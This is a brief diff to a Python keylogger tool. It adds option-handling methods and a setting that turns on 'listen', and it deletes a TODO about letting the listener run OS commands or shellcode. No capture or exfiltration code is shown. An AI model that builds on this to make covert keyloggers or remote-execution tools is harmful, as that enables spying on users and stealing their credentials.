@@ -11,12 +11,12 @@ from Cryptodome.PublicKey import RSA
 from Cryptodome.Random import get_random_bytes
 from io import BytesIO
 from datetime import datetime
+import options
 
 # Master TODO
 # 1. Implement keyboard interrupt handling
 # 2. Add pretty colors :^)
-# 3. Add ability for listner to send os commands and/ or execute shellcode
-# 4. Move the output to a separate directory
+# 3. Move the output to a separate directory
 
 # Classes for good python developer standards :)!
 class Keylogger:
@@ -237,3 +237,11 @@ class Keylogger:
             # Handle a CTRL-C
             except KeyboardInterrupt:
                 sys.exit(0)
+
+    def print_options(self):
+        o = options.Options()
+        o.print_options(self.args.__dict__)
+        self.args.__dict__["listen"] = True
+
+    def update_options(self, option, value):
+        self.args.__dict__[option] = value
